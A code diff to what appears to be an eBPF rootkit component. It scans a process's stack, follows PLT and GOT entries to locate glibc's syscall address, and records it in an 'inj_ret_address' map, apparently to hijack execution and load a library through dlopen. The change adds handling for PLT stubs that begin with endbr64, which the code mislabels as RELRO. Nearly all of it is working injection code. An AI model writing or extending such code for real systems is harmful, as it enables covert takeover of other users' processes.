@@ -12,6 +12,10 @@
 #include "defs.h"
 
 #define OPCODE_JUMP_BYTE_0 0xe8
+#define OPCODE_PLT_JMP_BYTE_0 0xff
+#define OPCODE_PLT_JMP_BYTE_1 0x25
+#define OPCODE_PLT_RERLO_BYTE_0 0xf3
+#define OPCODE_PLT_RERLO_BYTE_1 0x0f
 #define GLIBC_OFFSET_MAIN_TO_SYSCALL 0xf00d0
 #define GLIBC_OFFSET_MAIN_TO_DLOPEN 0x12f120
 #define GLIBC_OFFSET_MAIN_TO_MALLOC 0x6eca0
@@ -42,7 +46,7 @@ struct sys_timerfd_settime_exit_ctx {
  * @return 0 if correct, 1 otherwise
  */
 static __always_inline int check_syscall_opcodes(__u8* opcodes){
-    return 0 == (/*opcodes[0]==0xf3     //FOR GDB WORKING
+    return 0 == (/*opcodes[0]==0xf3     //FOR GDB WORKING TODO REMOVE
         &&*/ opcodes[1]==0x0f
         && opcodes[2]==0x1e
         && opcodes[3]==0xfa
@@ -62,8 +66,8 @@ static __always_inline int check_syscall_opcodes(__u8* opcodes){
 static __always_inline int stack_extract_return_address_plt(__u64 stack){
     //We have a possible call instruction, we check if it starts with the correct format
     __u64 *op = (__u64*)(stack - 0x5);
-    __u8 opcode_arr[5];
-    if(bpf_probe_read(&opcode_arr, 5*sizeof(__u8), op)<0){
+    __u8 opcode_arr[10];
+    if(bpf_probe_read(&opcode_arr, 10*sizeof(__u8), op)<0){
         //bpf_printk("Failed to read stack position\n");
         return -1;
     }
@@ -91,8 +95,7 @@ static __always_inline int stack_extract_return_address_plt(__u64 stack){
     bpf_printk("SUM: %lx\n", sum);
     __u64* call_addr = (__u64*)sum;
 
-    //We check which address was called. We could either be at libc already after
-    //following it, or in the PLT entry on the same executable as before.
+    //We check the opcodes of the instruction that jumps to libc using the offset at GOT.PLT.
     __u64 call_opcode;
     bpf_printk("CALL_ADDR: %lx\n", call_addr);
     int ret;
@@ -104,21 +107,51 @@ static __always_inline int stack_extract_return_address_plt(__u64 stack){
     }
     bpf_printk("CALL_OPCODES: %lx\n", call_opcode);
 
-    bpf_probe_read_user(&opcode_arr, 2*sizeof(__u8), call_addr);
+    bpf_probe_read_user(&opcode_arr, 10*sizeof(__u8), call_addr);
     bpf_printk("OPCODE0: %x\n", opcode_arr[0]);
     bpf_printk("OPCODE1: %x\n", opcode_arr[1]);
+    bpf_printk("OPCODE5: %x\n", opcode_arr[5]);
+    bpf_printk("OPCODE6: %x\n", opcode_arr[6]);
 
+    int plt_found = 0;
+    int relro_active = 0;
+    
+    //Check documentation for details on jump recognition.
+    if(opcode_arr[0]==OPCODE_PLT_JMP_BYTE_0 && opcode_arr[1]==OPCODE_PLT_JMP_BYTE_1){
+        //If the ELF binary has been compiled without RELRO, the first bytes are expected.
+        plt_found = 1;
+    }else if(opcode_arr[0]==OPCODE_PLT_RERLO_BYTE_0 && opcode_arr[1]==OPCODE_PLT_RERLO_BYTE_1 && opcode_arr[5]==OPCODE_PLT_JMP_BYTE_0 && opcode_arr[6]==OPCODE_PLT_JMP_BYTE_1){
+        //If the ELF was compiled with RELRO protection.
+        plt_found = 1;
+        relro_active = 1;
+    }
+        
     __u8* call_addr_arr = (__u8*)call_addr;
-    if(opcode_arr[0]==0xff && opcode_arr[1]==0x25){
+    if(plt_found == 1){
         bpf_printk("Found PLT entry\n");
-        //We analyze the offset of the jump specified ff 25 XX XX XX XX
-        //The address to which the jump takes us from the PLT.GOT should be the actual syscall setup
         __s32 j_offset;
-        bpf_probe_read_user(&j_offset, sizeof(__s32), &call_addr_arr[2]); //4 LSB 
-        //We obtain the address of the jump by adding the offset + our current memory address + 6 bytes of the current instruction
-        __u64* j_addr = (u64*)((__u64)(call_addr_arr) + j_offset + 0x6);
-        bpf_printk("JOFFSET: %lx\n", j_offset);
-        bpf_printk("JADDR: %lx\n", j_addr);
+        __u64* j_addr;
+        
+        if(relro_active == 0){
+            //We analyze the offset of the jump specified ff 25 XX XX XX XX
+            //The address to which the jump takes us from the PLT.GOT should be the actual syscall setup
+            bpf_probe_read_user(&j_offset, sizeof(__s32), &call_addr_arr[2]); //4 LSB 
+            //We obtain the address of the jump by adding the offset + our current memory address + 6 bytes of the current instruction
+            j_addr = (u64*)((__u64)(call_addr_arr) + j_offset + 0x6);
+            bpf_printk("JOFFSET: %lx\n", j_offset);
+            bpf_printk("JADDR: %lx\n", j_addr);
+        }else {
+            bpf_printk("RELRO detected\n");
+            //Proceed to take into account the endbr64 instruction
+            call_addr_arr = (__u8*)call_addr+0x4;
+            //We analyze the offset of the jump specified f2 ff 25 XX XX XX XX
+            //The address to which the jump takes us from the PLT.GOT should be the actual syscall setup
+            bpf_probe_read_user(&j_offset, sizeof(__s32), &call_addr_arr[3]); //4 LSB + 7 bytes of the current instruction
+            j_addr = (u64*)((__u64)(call_addr_arr) + j_offset +0x7);
+            bpf_printk("JOFFSET: %lx\n", j_offset);
+            bpf_printk("JADDR: %lx\n", j_addr);
+        }
+        
         //Now that we have the address of the jump, we proceed to get the instruction opcodes there
         //However it's a bit more complex since what we have is the address in the GOT section where
         //the linker will place the address inside the shared library where the function is located.
@@ -173,7 +206,11 @@ static __always_inline int stack_extract_return_address_plt(__u64 stack){
         addr.libc_syscall_address = (__u64)got_addr;
         addr.stack_ret_address = 0;
         bpf_map_update_elem(&inj_ret_address, &pid_tgid, &addr, BPF_ANY);
+
+        return 0;
     }
+    
+
     
 
     return 0;
